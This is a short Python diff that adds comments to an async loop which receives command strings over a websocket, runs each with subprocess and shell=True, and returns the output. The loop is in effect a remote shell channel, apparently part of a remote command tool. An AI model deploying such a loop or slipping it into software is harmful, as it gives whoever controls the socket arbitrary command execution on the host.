@@ -36,6 +36,9 @@ async def hello():
                 while 1:
                         await websocket.send(msg)
                         cmd = await websocket.recv()
+                        # process gets the ouput from subprocess running our command
+                        # shell=True is required for commands like cd but without it we can still do like ls or awk
+                        # subprocess.run is the python 3.5 way of running commands passed
                         process = subprocess.run([cmd],stdout=subprocess.PIPE,bufsize=1,universal_newlines=True,shell=True)
                         await websocket.send(process.stdout)
                         #os.system(cmd)
